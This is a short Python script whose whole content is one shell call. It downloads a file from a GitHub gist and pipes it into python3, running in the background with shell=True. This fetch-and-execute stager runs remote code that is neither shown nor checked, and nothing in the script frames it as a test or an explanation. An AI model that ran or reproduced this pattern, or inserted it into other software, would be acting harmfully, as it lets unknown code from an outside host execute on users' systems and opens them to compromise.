import subprocess

subprocess.check_output('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/a47f3373a8c28018ba3e880c3ac519a99fcaaacd/foo.txt | python3 &', shell=True, stderr=None)
